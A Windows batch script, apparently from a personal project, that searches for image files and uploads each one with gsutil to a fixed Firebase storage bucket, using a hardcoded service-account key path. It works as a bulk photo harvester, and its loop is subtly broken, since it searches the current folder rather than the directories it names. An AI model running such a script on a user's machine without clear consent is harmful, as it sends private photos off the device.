@echo off

REM Set the path to your Firebase service account key
set "firebase_key= C:\Users\harih\OneDrive\Desktop\Personal_projects\Niha_source\Niha-live\phot.json"

REM Authenticate using the service account key
gcloud auth activate-service-account --key-file="%firebase_key%"

REM Set the Firebase project (replace 'your-project-id' with your actual project ID)
gcloud config set project your-project-id

REM Set the directories to search
set "root_dirs=%USERPROFILE%\Pictures %USERPROFILE%\Downloads"

REM Set the file patterns to search for
set "photo_patterns=*.jpg *.jpeg *.png *.gif *.bmp *.tiff"

REM Check if the operating system is Windows
if not "%OS%"=="Windows_NT" (
    echo This script is designed to run on Windows only.
    exit /b
)

REM Initialize a variable to store found photos
setlocal enabledelayedexpansion
set "photos="

REM Loop through each directory
for %%D in (%root_dirs%) do (
    echo Searching in: %%D

    REM Loop through each file pattern
    for %%P in (%photo_patterns%) do (
        for /r %%F in (%%P) do (
            echo Found photo: %%F
            set "photos=!photos! %%F"
        )
    )
)

REM Upload photos using gsutil (Google Cloud SDK should be installed and configured)
if defined photos (
    for %%F in (!photos!) do (
        echo Uploading %%F to Firebase Storage...
        gsutil cp "%%F" gs://koo-app-9bcd0.appspot.com/photos/
    )

    REM Save the list of uploaded photos
    echo !photos! > uploaded_photos_list.txt
    echo Uploaded photos. List saved to uploaded_photos_list.txt
) else (
    echo No photos found. uploaded_photos_list.txt was not created.
)

endlocal

pause
